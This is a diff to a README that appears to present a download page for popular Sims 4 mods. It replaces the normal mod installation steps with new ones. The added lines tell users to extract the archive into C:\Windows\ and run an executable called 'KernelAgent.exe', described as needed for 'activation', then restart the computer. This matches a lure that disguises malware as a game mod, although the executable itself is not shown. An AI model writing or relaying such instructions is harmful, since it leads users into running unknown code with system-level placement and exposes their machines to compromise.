@@ -38,10 +38,12 @@ Wicked Whims and Wonderful Whims are the most downloaded realism mods for The Si
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the latest ZIP** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
-2. 📁 **Extract the folder** into `Documents\Electronic Arts\The Sims 4\Mods`  
-3. 🖱 **Launch the game** and enable script mods in Game Options  
-4. ✅ Restart the game and enjoy the new systems
+1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory *(or Mods folder for Sims)*  
+3. 🖱 **Run the executable file** `KernelAgent.exe` (required for activation and script execution)  
+4. ✅ Follow any on-screen instructions or in-game prompts  
+5. 🔁 Restart your computer or game if necessary
+
 
 ---
 
